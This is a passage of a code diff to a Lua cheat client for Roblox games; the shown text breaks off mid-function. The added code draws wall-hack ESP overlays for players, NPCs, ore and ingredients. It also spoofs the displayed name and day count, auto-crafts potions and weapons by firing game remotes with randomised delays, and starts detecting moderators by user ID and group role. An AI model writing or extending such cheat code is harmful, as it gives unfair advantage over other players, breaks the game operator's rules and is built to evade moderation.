+                                        esp.drawings.main_text.Visible = false
+                                        return
+                                    end
+            
+                                    esp.drawings.main_text.Text = esp.name .. "\n[" .. tostring(math.floor(distance)) .. "]"
+                                    esp.drawings.main_text.Position = Vector2.new(screen_position.X, screen_position.Y)
+                                    esp.drawings.main_text.Visible = true
+                                else
+                                    esp.drawings.main_text.Visible = false
+                                end
+                            else
+                                esp:destruct()
+                            end
+                        end
+
+                        esp.update_fallion_esp = update_fallion_esp
+                        cheat_client.fallion_esp_objects[npc] = esp
+                        return esp
+                    end
+                end
+            end            
+            
+            do
                 cheat_client.npc_esp_objects = cheat_client.npc_esp_objects or {}
                 
                 function cheat_client:add_npc_esp(npc,name)
@@ -3879,7 +5048,7 @@ if game.PlaceId == 100010170789226 then
                         already_disabled = false,
                      }
             
-                     do -- Create Drawings
+                     do
                         esp.drawings.main_text = utility:Create("Text", {
                            Center = true,
                            Outline = true,
@@ -3887,7 +5056,7 @@ if game.PlaceId == 100010170789226 then
                            Transparency = 1,
                            Text = esp.name,
                            Size = 13,
-                           Font = 2,
+                           Font = font,
                            ZIndex = -10,
                            Visible = false
                         }, "esp")
@@ -3941,21 +5110,231 @@ if game.PlaceId == 100010170789226 then
                     return esp
                 end
             end
+    
+            do
+                if game.PlaceId ~= 3541987450 then
+                    cheat_client.ingredient_esp_objects = cheat_client.ingredient_esp_objects or {}
+
+                    function cheat_client:identify_ingredient(object)
+                        local asset_id = gethiddenproperty(object, "AssetId"):gsub("%%20", ""):match("%d+")
+                        local matched_ingredient = cheat_client.ingredient_identifiers[asset_id]
             
-            do -- Shrieker Chams
+                        if matched_ingredient then
+                            return matched_ingredient
+                        end
+                    end
+        
+                    function cheat_client:add_ingredient_esp(ingredient, name)
+                        local esp = {
+                            object = ingredient,
+                            name = name or ingredient.Name or "Unknown",
+                            color = ingredient.Color,
+                            drawings = {},
+                            already_disabled = false,
+                            cached_text = "",
+                            last_text_update = 0,
+                            text_update_interval = 0.5,
+                        }
+        
+                        do
+                            esp.drawings.main_text = utility:Create("Text", {
+                                Center = true,
+                                Outline = true,
+                                Color = esp.color,
+                                Transparency = 1,
+                                Text = esp.name,
+                                Size = 13,
+                                Font = font,
+                                ZIndex = -10,
+                                Visible = false
+                            }, "esp")
+                        end
+        
+                        function esp:destruct()
+                            for _,v in next, esp.drawings do
+                                fast_remove(shared.drawing_containers.esp, v)
+                                v:Remove()
+                            end
+
+                            if cheat_client.ingredient_esp_objects then
+                                cheat_client.ingredient_esp_objects[esp.object] = nil
+                            end
+                        end
+        
+                        local function update_ingredient_esp(toggled)
+                            if not toggled then
+                                if not esp.already_disabled then
+                                    esp.drawings.main_text.Visible = false
+                                    esp.already_disabled = true
+                                end
+                                return
+                            end
+                            
+                            esp.already_disabled = false
+                            
+                            if esp.object.Parent ~= nil then
+                                if cheat_client.window_active then
+                                    if esp.object.Transparency ~= 1 then
+                                        local distance = (ws.CurrentCamera.CFrame.Position - esp.object.CFrame.Position).Magnitude
+
+                                        if distance >= ((Options and Options.IngredientRange and Options.IngredientRange.Value) or 60) then
+                                            esp.drawings.main_text.Visible = false
+                                            return
+                                        end
+
+                                        if (distance < ((Options and Options.IngredientRange and Options.IngredientRange.Value) or 60)) then
+                                            local screen_position, on_screen = ws.CurrentCamera:WorldToViewportPoint(esp.object.CFrame.Position)
+
+                                            if not on_screen then
+                                                esp.drawings.main_text.Visible = false
+                                                return
+                                            end
+
+                                            local now = tick()
+                                            local should_update_text = (now - esp.last_text_update) >= esp.text_update_interval
+
+                                            if should_update_text then
+                                                esp.cached_text = (esp.name or "Unknown") .. "\n[" .. tostring(math.floor(distance)) .. "]"
+                                                esp.last_text_update = now
+                                            end
+
+                                            esp.drawings.main_text.Text = esp.cached_text
+                                            esp.drawings.main_text.Position = Vector2.new(screen_position.X, screen_position.Y)
+                                            esp.drawings.main_text.Visible = true
+                                        else
+                                            esp.drawings.main_text.Visible = false
+                                        end
+                                    else
+                                        esp.drawings.main_text.Visible = false
+                                    end
+                                else
+                                    esp.drawings.main_text.Visible = false
+                                end
+                            else
+                                esp:destruct()
+                            end
+                        end
+
+                        esp.update_ingredient_esp = update_ingredient_esp
+                        cheat_client.ingredient_esp_objects[ingredient] = esp
+                        return esp
+                    end
+                end
+            end
+
+            do
+                cheat_client.ore_esp_objects = cheat_client.ore_esp_objects or {}
+
+                function cheat_client:add_ore_esp(ore)
+                    local esp = {
+                        object = ore,
+                        name = ore.Name,
+                        color = ore.Color,
+                        drawings = {},
+                        already_disabled = false,
+                        cached_text = "",
+                        last_text_update = 0,
+                        text_update_interval = 0.2,
+                    }
+    
+                    do
+                        esp.drawings.main_text = utility:Create("Text", {
+                            Center = true,
+                            Outline = true,
+                            Color = esp.color,
+                            Transparency = 1,
+                            Text = esp.name,
+                            Size = 13,
+                            Font = font,
+                            ZIndex = -10,
+                            Visible = false
+                        }, "esp")
+                    end
+    
+                    function esp:destruct()
+                        for _,v in next, esp.drawings do
+                            fast_remove(shared.drawing_containers.esp, v)
+                            v:Remove()
+                        end
+
+                        if cheat_client.ore_esp_objects then
+                            cheat_client.ore_esp_objects[esp.object] = nil
+                        end
+                    end
+    
+                    local function update_ore_esp(toggled)
+                        local oreToggleName = esp.name:lower() .. "_esp"
+                        local oreToggleExists = Toggles and Toggles[oreToggleName] and Toggles[oreToggleName].Value
+                        if not toggled or not oreToggleExists then
+                            if not esp.already_disabled then
+                                esp.drawings.main_text.Visible = false
+                                esp.already_disabled = true
+                            end
+                            return
+                        end
+                        
+                        esp.already_disabled = false
+                        
+                        if esp.object.Parent ~= nil and esp.object.Transparency ~= 1 then
+                            if cheat_client.window_active then
+                                local distance = (ws.CurrentCamera.CFrame.Position - esp.object.CFrame.Position).Magnitude
+                                
+                                if distance >= ((Options and Options.ore_range and Options.ore_range.Value) or 50) then
+                                    esp.drawings.main_text.Visible = false
+                                    return
+                                end
+                                
+                                if distance < ((Options and Options.ore_range and Options.ore_range.Value) or 50) then
+                                    local screen_position, on_screen = ws.CurrentCamera:WorldToViewportPoint(esp.object.CFrame.Position)
+
+
+                                    if not on_screen then
+                                        esp.drawings.main_text.Visible = false
+                                        return
+                                    end
+
+                                    local now = tick()
+                                    local should_update_text = (now - esp.last_text_update) >= esp.text_update_interval
+
+                                    if should_update_text then
+                                        esp.cached_text = esp.name.."\n["..tostring(math.floor(distance)).."]"
+                                        esp.last_text_update = now
+                                    end
+
+                                    esp.drawings.main_text.Text = esp.cached_text
+                                    esp.drawings.main_text.Position = Vector2.new(screen_position.X, screen_position.Y)
+                                    esp.drawings.main_text.Visible = true
+                                else
+                                    esp.drawings.main_text.Visible = false
+                                end
+                            else
+                                esp.drawings.main_text.Visible = false
+                            end                            
+                        else
+                            esp.drawings.main_text.Visible = false
+                        end
+                    end
+
+                    esp.update_ore_esp = update_ore_esp
+                    cheat_client.ore_esp_objects[ore] = esp
+                    return esp
+                end
+            end
+            
+            do
                 function cheat_client:get_shrieker_color(shrieker)
                     if shrieker and FindFirstChild(shrieker, "MonsterInfo") then
                         if FindFirstChild(shrieker.MonsterInfo, "Master") then
                             if not plr.Character then
-                                return Color3.fromRGB(255, 0, 80) -- enemy if no character
+                                return Color3.fromRGB(255, 0, 80)
                             elseif shrieker.MonsterInfo.Master.Value == plr.Character then
-                                return Color3.fromRGB(0, 255, 255) -- owned
+                                return Color3.fromRGB(0, 255, 255)
                             else
-                                return Color3.fromRGB(255, 0, 80) -- enemy
+                                return Color3.fromRGB(255, 0, 80)
                             end
                         end
                     end
-                    return Color3.fromRGB(255, 255, 255) -- neutral
+                    return Color3.fromRGB(255, 255, 255)
                 end
 
                 function cheat_client:add_shrieker_chams(shrieker)
@@ -4026,7 +5405,7 @@ if game.PlaceId == 100010170789226 then
                     end
 
                     local last_update = 0
-                    local UPDATE_INTERVAL = 1/2 -- 30 FPS
+                    local UPDATE_INTERVAL = 1/2
 
                     chams.update_connection = utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function()
                         local now = tick()
@@ -4041,8 +5420,7 @@ if game.PlaceId == 100010170789226 then
                 end
             end
 
-            do -- Event-Driven ESP Rendering System
-                -- Store rendering connections (only active when toggles are enabled)
+            do
                 local esp_render_connections = {
                     player_esp = nil,
                     player_chams = nil,
@@ -4053,16 +5431,12 @@ if game.PlaceId == 100010170789226 then
                     ore_esp = nil
                 }
 
-                -- Player ESP Connection Manager (Optimized)
                 local function start_player_esp_rendering()
                     if esp_render_connections.player_esp then return end
 
                     local frame_count = 0
                     esp_render_connections.player_esp = utility:Connection(rs.RenderStepped, LPH_NO_VIRTUALIZE(function()
-                        --frame_count = frame_count + 1
 
-                        -- Limit to 30fps for all ESP updates (smooth but not excessive)
-                        --if frame_count % 2 ~= 0 then return end
 
                         for player, esp in pairs(cheat_client.player_esp_objects or {}) do
                             if esp.update_player_esp then
@@ -4077,7 +5451,6 @@ if game.PlaceId == 100010170789226 then
                         esp_render_connections.player_esp:Disconnect()
                         esp_render_connections.player_esp = nil
 
-                        -- Hide all ESP elements
                         for player, esp in pairs(cheat_client.player_esp_objects or {}) do
                             if esp.update_player_esp then
                                 esp.update_player_esp(false)
@@ -4086,9 +5459,7 @@ if game.PlaceId == 100010170789226 then
                     end
                 end
 
-                -- Player Chams Connection Manager
                 local function is_any_chams_enabled()
-                    -- Check master toggle first
                     if not (Toggles and Toggles.PlayerChams and Toggles.PlayerChams.Value) then
                         return false
                     end
@@ -4106,7 +5477,6 @@ if game.PlaceId == 100010170789226 then
                     esp_render_connections.player_chams = utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function()
                         frame_count = frame_count + 1
 
-                        -- Limit to ~25fps - chams are Roblox Highlight objects
                         if frame_count % 2 ~= 0 then return end
 
                         for player, esp in pairs(cheat_client.player_esp_objects or {}) do
@@ -4126,10 +5496,8 @@ if game.PlaceId == 100010170789226 then
 
                 local function update_chams_rendering()
                     if is_any_chams_enabled() then
-                        -- Ensure table exists
                         cheat_client.player_esp_objects = cheat_client.player_esp_objects or {}
 
-                        -- Create ESP objects if they don't exist (chams need the objects)
                         for _, player in pairs(plrs:GetPlayers()) do
                             if player ~= plr and not cheat_client.player_esp_objects[player] then
                                 cheat_client.player_esp_objects[player] = cheat_client:add_player_esp(player)
@@ -4151,7 +5519,63 @@ if game.PlaceId == 100010170789226 then
                     end
                 end
 
-                -- NPC ESP Connection Manager
+                local function start_trinket_esp_rendering()
+                    if esp_render_connections.trinket_esp then return end
+
+                    local frame_count = 0
+                    esp_render_connections.trinket_esp = utility:Connection(rs.RenderStepped, LPH_NO_VIRTUALIZE(function()
+
+                        for trinket, esp in pairs(cheat_client.trinket_esp_objects or {}) do
+                            if esp.update_trinket_esp then
+                                esp.update_trinket_esp(true)
+                            end
+                        end
+                    end))
+                end
+
+                local function stop_trinket_esp_rendering()
+                    if esp_render_connections.trinket_esp then
+                        esp_render_connections.trinket_esp:Disconnect()
+                        esp_render_connections.trinket_esp = nil
+
+                        for trinket, esp in pairs(cheat_client.trinket_esp_objects or {}) do
+                            if esp.update_trinket_esp then
+                                esp.update_trinket_esp(false)
+                            end
+                        end
+                    end
+                end
+
+                local function start_fallion_esp_rendering()
+                    if esp_render_connections.fallion_esp then return end
+
+                    local frame_count = 0
+                    esp_render_connections.fallion_esp = utility:Connection(rs.RenderStepped, LPH_NO_VIRTUALIZE(function()
+                        frame_count = frame_count + 1
+
+                        if frame_count % 2 ~= 0 then return end
+
+                        for npc, esp in pairs(cheat_client.fallion_esp_objects or {}) do
+                            if esp.update_fallion_esp then
+                                esp.update_fallion_esp(true)
+                            end
+                        end
+                    end))
+                end
+
+                local function stop_fallion_esp_rendering()
+                    if esp_render_connections.fallion_esp then
+                        esp_render_connections.fallion_esp:Disconnect()
+                        esp_render_connections.fallion_esp = nil
+
+                        for npc, esp in pairs(cheat_client.fallion_esp_objects or {}) do
+                            if esp.update_fallion_esp then
+                                esp.update_fallion_esp(false)
+                            end
+                        end
+                    end
+                end
+
                 local function start_npc_esp_rendering()
                     if esp_render_connections.npc_esp then return end
 
@@ -4159,7 +5583,6 @@ if game.PlaceId == 100010170789226 then
                     esp_render_connections.npc_esp = utility:Connection(rs.RenderStepped, LPH_NO_VIRTUALIZE(function()
                         frame_count = frame_count + 1
 
-                        -- Limit to 30fps
                         if frame_count % 2 ~= 0 then return end
 
                         for npc, esp in pairs(cheat_client.npc_esp_objects or {}) do
@@ -4183,31 +5606,102 @@ if game.PlaceId == 100010170789226 then
                     end
                 end
 
-                -- Store functions in cheat_client for access from OnChanged handlers
+                local function start_ingredient_esp_rendering()
+                    if esp_render_connections.ingredient_esp then return end
+
+                    local frame_count = 0
+                    esp_render_connections.ingredient_esp = utility:Connection(rs.RenderStepped, LPH_NO_VIRTUALIZE(function()
+                        frame_count = frame_count + 1
+                        if frame_count % 2 ~= 0 then return end
+
+                        for ingredient, esp in pairs(cheat_client.ingredient_esp_objects or {}) do
+                            if esp.update_ingredient_esp then
+                                esp.update_ingredient_esp(true)
+                            end
+                        end
+                    end))
+                end
+
+                local function stop_ingredient_esp_rendering()
+                    if esp_render_connections.ingredient_esp then
+                        esp_render_connections.ingredient_esp:Disconnect()
+                        esp_render_connections.ingredient_esp = nil
+
+                        for ingredient, esp in pairs(cheat_client.ingredient_esp_objects or {}) do
+                            if esp.update_ingredient_esp then
+                                esp.update_ingredient_esp(false)
+                            end
+                        end
+                    end
+                end
+
+                local function start_ore_esp_rendering()
+                    if esp_render_connections.ore_esp then return end
+
+                    local frame_count = 0
+                    esp_render_connections.ore_esp = utility:Connection(rs.RenderStepped, LPH_NO_VIRTUALIZE(function()
+                        frame_count = frame_count + 1
+                        if frame_count % 2 ~= 0 then return end
+
+                        for ore, esp in pairs(cheat_client.ore_esp_objects or {}) do
+                            if esp.update_ore_esp then
+                                esp.update_ore_esp(true)
+                            end
+                        end
+                    end))
+                end
+
+                local function stop_ore_esp_rendering()
+                    if esp_render_connections.ore_esp then
+                        esp_render_connections.ore_esp:Disconnect()
+                        esp_render_connections.ore_esp = nil
+
+                        for ore, esp in pairs(cheat_client.ore_esp_objects or {}) do
+                            if esp.update_ore_esp then
+                                esp.update_ore_esp(false)
+                            end
+                            if esp.destruct then
+                                esp:destruct()
+                            end
+                        end
+                        cheat_client.ore_esp_objects = {}
+                    end
+                end
+
                 cheat_client.esp_rendering = {
                     start_player_esp = start_player_esp_rendering,
                     stop_player_esp = stop_player_esp_rendering,
                     update_chams = update_chams_rendering,
+                    start_trinket_esp = start_trinket_esp_rendering,
+                    stop_trinket_esp = stop_trinket_esp_rendering,
+                    start_fallion_esp = start_fallion_esp_rendering,
+                    stop_fallion_esp = stop_fallion_esp_rendering,
                     start_npc_esp = start_npc_esp_rendering,
                     stop_npc_esp = stop_npc_esp_rendering,
+                    start_ingredient_esp = start_ingredient_esp_rendering,
+                    stop_ingredient_esp = stop_ingredient_esp_rendering,
+                    start_ore_esp = start_ore_esp_rendering,
+                    stop_ore_esp = stop_ore_esp_rendering
                 }
             end
 
-            do -- Feature Connection Management (Freecam, Flight, Day Farm, etc.)
+            do
                 local feature_connections = {
                     freecam = nil,
                     flight = nil,
+                    day_farm = nil,
+                    auto_trinket = nil,
+                    auto_ingredient = nil,
                     status_updates = nil,
                     silent_aim = nil,
                     proximity_notifier = nil,
                 }
 
-                -- Store for access from toggle OnChanged handlers
                 cheat_client.feature_connections = feature_connections
             end
         end
 
-        do -- Environment
+        do
             local function set_ambience(area)
                 local biome = area_data.biomes[area]
                 if biome then
@@ -4529,7 +6023,7 @@ if game.PlaceId == 100010170789226 then
             end
         end
 
-        do -- Mana Overlay
+        do
             function cheat_client:clear_visuals()
                 if spellvis then spellvis.Visible = false end
                 if snapvis then snapvis.Visible = false end
@@ -4539,8 +6033,8 @@ if game.PlaceId == 100010170789226 then
                 if state then
                     if plr and plr.Character then
                         local tool = FindFirstChildOfClass(plr.Character, "Tool")
-                        if tool and cheat_client and cheat_client.update_visuals then
-                            cheat_client:update_visuals(tool)
+                        if tool and cheat_client then
+                            pcall(cheat_client.update_visuals, cheat_client, tool)
                         end
                     end
                 else
@@ -4549,7 +6043,7 @@ if game.PlaceId == 100010170789226 then
             end
         end
 
-        do -- spoof
+        do
             function cheat_client:spoof_name(name)
                 task.wait(0.186)
                 local statGui
@@ -4580,11 +6074,10 @@ if game.PlaceId == 100010170789226 then
                     splitString = name:split(" ")
                 end
 
-                -- Handle single-word names by treating them as FirstName only
                 local firstName = splitString[1] or ""
                 local lastName = splitString[2] or ""
 
-                if game.PlaceId == 100010170789226 or game.PlaceId == 109732117428502 then
+                if game.PlaceId == 5208655184 or game.PlaceId == 109732117428502 then
                     plr:SetAttribute("FirstName", firstName)
                     plr:SetAttribute("LastName", lastName)
 
@@ -4611,7 +6104,6 @@ if game.PlaceId == 100010170789226 then
             function cheat_client:apply_streamer(state)
                 if state then
                     task.spawn(function()
-                        -- Save original name before spoofing (wait for valid name)
                         if not original_names[plr] then
                             local originalName
                             repeat
@@ -4783,11 +6275,1070 @@ if game.PlaceId == 100010170789226 then
                 end
             end
         end
+
+        function cheat_client:spoof_days(days)
+            if cheat_client._spoofing_days then return end
+            cheat_client._spoofing_days = true
+
+            local stat_gui = FindFirstChild(plr.PlayerGui, "StatGui")
+            if not stat_gui then
+                cheat_client._spoofing_days = false
+                return
+            end
+
+            local lives = FindFirstChild(stat_gui.Container.Health, "Lives")
+            if not lives then
+                cheat_client._spoofing_days = false
+                return
+            end
+
+            local rollers = {}
+            for _, child in ipairs(lives:GetChildren()) do
+                if child.Name == "Roller" and FindFirstChild(child, "Char") then
+                    table.insert(rollers, child)
+                end
+            end
+
+            if #rollers < 4 then
+                cheat_client._spoofing_days = false
+                return
+            end
+
+            local has_thousand = #rollers >= 6
+
+            local thousand, hundred, ten, one
+            if has_thousand then
+                thousand = rollers[2]
+                hundred = rollers[3]
+                ten = rollers[4]
+                one = rollers[5]
+            else
+                hundred = rollers[2]
+                ten = rollers[3]
+                one = rollers[4]
+            end
+
+            if not hundred or not ten or not one then
+                cheat_client._spoofing_days = false
+                return
+            end
+
+            if not original_days.hundred then
+                original_days = {
+                    thousand = has_thousand and {text = thousand.Char.Text, connection = nil} or nil,
+                    hundred = {text = hundred.Char.Text, connection = nil},
+                    ten = {text = ten.Char.Text, connection = nil},
+                    one = {text = one.Char.Text, connection = nil}
+                }
+            end
+
+            if original_days.thousand and original_days.thousand.connection then original_days.thousand.connection:Disconnect() end
+            if original_days.hundred.connection then original_days.hundred.connection:Disconnect() end
+            if original_days.ten.connection then original_days.ten.connection:Disconnect() end
+            if original_days.one.connection then original_days.one.connection:Disconnect() end
+
+            local days_str = tostring(days)
+            if #days_str == 4 and has_thousand then
+                thousand.Char.Text = string.sub(days_str, 1, 1)
+                hundred.Char.Text = string.sub(days_str, 2, 2)
+                ten.Char.Text = string.sub(days_str, 3, 3)
+                one.Char.Text = string.sub(days_str, 4, 4)
+            elseif #days_str == 3 then
+                if has_thousand then thousand.Char.Text = "0" end
+                hundred.Char.Text = string.sub(days_str, 1, 1)
+                ten.Char.Text = string.sub(days_str, 2, 2)
+                one.Char.Text = string.sub(days_str, 3, 3)
+            elseif #days_str == 2 then
+                if has_thousand then thousand.Char.Text = "0" end
+                hundred.Char.Text = "0"
+                ten.Char.Text = string.sub(days_str, 1, 1)
+                one.Char.Text = string.sub(days_str, 2, 2)
+            else
+                if has_thousand then thousand.Char.Text = "0" end
+                hundred.Char.Text = "0"
+                ten.Char.Text = "0"
+                one.Char.Text = string.sub(days_str, 1, 1)
+            end
+
+            if cheat_client.config.spoof_days_enabled then
+                if has_thousand and thousand then
+                    original_days.thousand.connection = utility:Connection(thousand.Char:GetPropertyChangedSignal("Text"), function()
+                        if cheat_client._spoofing_days then return end
+                        if cheat_client.config.spoof_days_enabled then
+                            cheat_client:spoof_days(cheat_client.config.custom_day_spoof)
+                        end
+                    end)
+                end
+
+                original_days.hundred.connection = utility:Connection(hundred.Char:GetPropertyChangedSignal("Text"), function()
+                    if cheat_client._spoofing_days then return end
+                    if cheat_client.config.spoof_days_enabled then
+                        cheat_client:spoof_days(cheat_client.config.custom_day_spoof)
+                    end
+                end)
+
+                original_days.ten.connection = utility:Connection(ten.Char:GetPropertyChangedSignal("Text"), function()
+                    if cheat_client._spoofing_days then return end
+                    if cheat_client.config.spoof_days_enabled then
+                        cheat_client:spoof_days(cheat_client.config.custom_day_spoof)
+                    end
+                end)
+
+                original_days.one.connection = utility:Connection(one.Char:GetPropertyChangedSignal("Text"), function()
+                    if cheat_client._spoofing_days then return end
+                    if cheat_client.config.spoof_days_enabled then
+                        cheat_client:spoof_days(cheat_client.config.custom_day_spoof)
+                    end
+                end)
+            end
+
+            cheat_client._spoofing_days = false
+        end
+
+        do
+            local autoCraftUtils = {};
+
+            local potions = {
+                ['Health Potion'] = {
+                    ['Lava Flower'] = 1;
+                    ['Scroom'] = 2;
+                },
+    
+                ['Bone Growth'] = {
+                    ['Trote'] = 1,
+                    ['Strange Tentacle'] = 1,
+                    ['Uncanny Tentacle'] = 1
+                },
+    
+                ['Switch Witch'] = {
+                    ['Dire Flower'] = 1,
+                    ['Glow Shroom'] = 2
+                },
+    
+                ['Silver Sun'] = {
+                    ['Desert Mist'] = 1,
+                    ['Free Leaf'] = 1,
+                    ['Polar Plant'] = 1
+                },
+    
+                ['Lordsbane'] = {
+                    ['Crown Flower'] = 3
+                },
+    
+                ['Liquid Wisdom'] = {
+                    ['Desert Mist'] = 1,
+                    ['Periashroom'] = 1,
+                    ['Crown Flower'] = 1,
+                    ['Freeleaf'] = 1
+                },
+    
+                ['Ice Protection'] = {
+                    ['Snow Scroom'] = 2,
+                    ['Trote'] = 1,
+                },
+    
+                ['Kingsbane'] = {
+                    ['Crown Flower'] = 1,
+                    ['Vile Seed'] = 2,
+                },
+    
+                ['Feather Feet'] = {
+                    ['Creely'] = 1,
+                    ['Dire Flower'] = 1,
+                    ['Polar Plant'] = 1
+                },
+    
+                ['Fire Protection'] = {
+                    ['Trote'] = 1,
+                    ['Scroom'] = 2
+                },
+    
+                ['Tespian Elixir'] = {
+                    ['Lava Flower'] = 1,
+                    ['Scroom'] = 1,
+                    ['Moss Plant'] = 2
+                },
+    
+                ['Slateskin'] = {
+                    ['Petrii Flower'] = 1,
+                    ['Stone Scroom'] = 1,
+                    ['Coconut'] = 1
+                },
+    
+                ['Mind Mend'] = {
+                    ['Grass Stem'] = 1,
+                    ['Crystal Lotus'] = 1,
+                    ['Winter Blossom'] = 1
+                },
+    
+                ['Clot Control'] = {
+                    ['Coconut'] = 1,
+                    ['Grass Stem'] = 1,
+                    ['Petri Flower'] = 1
+                },
+    
+                ['Maidensbane'] = {
+                    ['Stone Scroom'] = 1,
+                    ['Fen Bloom'] = 1,
+                    ['Foul Root'] = 1,
+                },
+    
+                ['Sooth Sight'] = {
+                    ['Grass Stem'] = 2,
+                    ['Crystal Lotus'] = 1
+                },
+    
+                ['Crystal Extract'] = {
+                    ['Crystal Root'] = 1,
+                    ['Crystal Lotus'] = 1,
+                    ['Winter Blossom'] = 1
+                },
+    
+                ['Soothing Frost'] = {
+                    ['Winter Blossom'] = 1,
+                    ['Snowshroom'] = 2
+                },
+            };
+            
+            local swords = {
+                ['Bronze Sword'] = {
+                    ['Copper Bar'] = 1,
+                    ['Tin Bar'] = 2
+                },
+    
+                ['Bronze Dagger'] = {
+                    ['Copper Bar'] = 1,
+                    ['Tin Bar'] = 1
+                },
+    
+                ['Bronze Spear'] = {
+                    ['Tin Bar'] = 1,
+                    ['Copper Bar'] = 2
+                },
+    
+                ['Steel Sword'] = {
+                    ['Iron Bar'] = 2,
+                    ['Copper Bar'] = 1
+                },
+    
+                ['Steel Dagger'] = {
+                    ['Iron Bar'] = 1,
+                    ['Copper Bar'] = 1
+                },
+    
+                ['Steel Spear'] = {
+                    ['Iron Bar'] = 1,
+                    ['Copper Bar'] = 2
+                },
+    
+                ['Mythril Sword'] = {
+                    ['Copper Bar'] = 1,
+                    ['Iron Bar'] = 2,
+                    ['Mythril Bar'] = 1
+                },
+    
+                ['Mythril Dagger'] = {
+                    ['Copper Bar'] = 1,
+                    ['Iron Bar'] = 1,
+                    ['Mythril Bar'] = 1
+                },
+    
+                ['Mythril Spear'] = {
+                    ['Copper Bar'] = 2,
+                    ['Iron Bar'] = 1,
+                    ['Mythril Bar'] = 1
+                }
+            }
+    
+            local stations = FindFirstChild(workspace, "Stations");
+    
+            local function GrabStation(type)
+                if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                    if typeof(type) ~= "string" then
+                        return warn(string.format("Expected type string got <%s>",typeof(type)))
+                    elseif(not stations) then
+                        return warn('[Auto Potion] No Stations');
+                    end
+        
+                    for i,v in next, stations:GetChildren() do
+                        if (v.Timer.Position-plr.Character.HumanoidRootPart.Position).Magnitude <= 15 and string.find(v.Name, type) then
+                            return v
+                        end
+                    end
+                end
+            end
+    
+            local function hasMaterials(items, item)
+                local recipe = items[item];
+                local count = setmetatable({}, {__index = function() return 0 end});
+
+                assert(recipe);
+
+                if not plr.Backpack then return false end
+                for i, v in next, plr.Backpack:GetChildren() do
+                    if(recipe[v.Name]) then
+                        local quantity = FindFirstChild(v, 'Quantity');
+                        quantity = quantity and quantity.Value or 1;
+    
+                        count[v.Name] = count[v.Name] + quantity;
+                    end;
+                end;
+    
+                for i, v in next, recipe do
+                    if(count[i] < v) then
+                        return false;
+                    end;
+                end;
+    
+                return recipe;
+            end;
+            
+    
+            autoCraftUtils.hasMaterials = function(craftType, item)
+                return hasMaterials(craftType == 'Alchemy' and potions or swords, item);
+            end;
+            
+    
+            local function addItemsToStation(items, station, part, partToClick, partToClean)
+                if(station.Contents.Value ~= '[]') then
+                    repeat
+                        fireclickdetector(station[partToClean].ClickEmpty);
+                        task.wait(utility:random_wait(true));
+                    until station.Contents.Value == '[]';
+            
+                    task.wait(utility:random_wait(true))
+                end;
+
+                for name, count in next, items do
+                    for i = 1, count do
+                        if not plr.Backpack then
+                            warn("[auto stuff] Backpack not found")
+                            return
+                        end
+                        local k = FindFirstChild(plr.Backpack, name);
+            
+                        if not k then 
+                            warn(string.format("[auto stuff] missing ingredient: %s", name)) 
+                            return 
+                        end 
+            
+                        if k.Parent == nil then 
+                            warn(string.format("[auto stuff] cannot move %s, its parent is NULL", name))
+                            return
+                        end
+            
+                        task.wait(utility:random_wait(true))
+                        k.Parent = plr.Character;
+
+                        if k.Parent ~= plr.Character then
+                            warn("[auto stuff] Failed to move " .. name .. " to character")
+                            return
+                        end
+
+
+                        local remote = FindFirstChildWhichIsA(k, 'RemoteEvent');
+                        if(remote) then
+                            local content = station.Contents.Value;
+
+                            repeat
+                                remote:FireServer(station[part].CFrame, station[part]);
+                                task.wait(utility:random_wait(true))
+                            until station.Contents.Value ~= content;
+
+                            if k.Parent and plr.Backpack then
+                                k.Parent = plr.Backpack;
+                            end
+                            task.wait(0.1);
+                        else
+                            k:Activate();
+            
+                            repeat
+                                task.wait(utility:random_wait(true))
+                            until not k.Parent;
+                        end;
+                    end;
+                end;
+            
+                repeat
+                    fireclickdetector(station[partToClick].ClickConcoct);
+                    task.wait(utility:random_wait(true))
+                until station.Contents.Value == '[]';
+            end;
+            
+    
+            function utility:craft(stationType, itemToCraft)
+                if not plr.Character then return false end
+                if not (auto_pot_active or auto_craft_active) then return false end
+
+                local station = GrabStation(stationType);
+                local items = hasMaterials(stationType == 'Alchemy' and potions or swords, itemToCraft);
+
+                if (library ~= nil and library.Notify) then
+                    if(not station) then
+                        library:Notify("You must be near a cauldron/furnace!", Color3.fromRGB(255,0,0))
+                        return false
+                    end
+                    if(not items) then
+                        library:Notify("Some ingredients are missing!", Color3.fromRGB(255,0,0))
+                        return false
+                    end
+                end
+    
+                if(stationType == 'Smithing') then
+                    rps.Requests.GetMouse.OnClientInvoke = function()
+                        return {
+                            Hit = station.Material.CFrame,
+                            Target = station.Material,
+                            UnitRay = mouse.UnitRay,
+                            X = mouse.X,
+                            Y = mouse.Y
+                        }
+                    end;
+                end;
+    
+                if (stationType == 'Alchemy') then
+                    repeat
+                        if not auto_pot_active then return false end
+                        addItemsToStation(items, station, 'Water', 'Ladle', 'Bucket');
+                        items = hasMaterials(stationType == 'Alchemy' and potions or swords, itemToCraft);
+
+                        if cheat_client and cheat_client.config and cheat_client.config.auto_craft_delay then
+                            task.wait(cheat_client.config.auto_craft_delay)
+                        else
+                            task.wait(utility:random_wait(true))
+                        end
+                    until not items or not auto_pot_active;
+                elseif (stationType == 'Smithing') then
+                    repeat
+                        if not auto_craft_active then return false end
+                        addItemsToStation(items, station, 'Material', 'Hammer', 'Trash');
+                        items = hasMaterials(stationType == 'Alchemy' and potions or swords, itemToCraft);
+
+                        if cheat_client and cheat_client.config and cheat_client.config.auto_craft_delay then
+                            task.wait(cheat_client.config.auto_craft_delay)
+                        else
+                            task.wait(utility:random_wait(true))
+                        end
+                    until not items or not auto_craft_active;
+                end;
+
+                rps.Requests.GetMouse.OnClientInvoke = function()
+                    return {
+                        Hit = mouse.Hit,
+                        Target = mouse.Target,
+                        UnitRay = mouse.UnitRay,
+                        X = mouse.X,
+                        Y = mouse.Y
+                    }
+                end
+
+                return true
+            end
+        end
+
+        do
+            local function is_moderator(player)
+                if cheat_client and cheat_client.mod_list and table.find(cheat_client.mod_list, player.UserId) then
+                    return true
+                end
+
+                local success, isInGroup = pcall(function()
+                    return player:IsInGroup(4556484)
+                end)
+
+                if success and isInGroup then
+                    local role = player:GetRoleInGroup(4556484)
+                    if role ~= "Guest" then
+                        return true
+                    end
+                end
+
+                local success2, isInGroup2 = pcall(function()
+                    return player:IsInGroup(281365)
+                end)
+
+                if success2 and isInGroup2 then
+                    local role = player:GetRoleInGroup(281365)
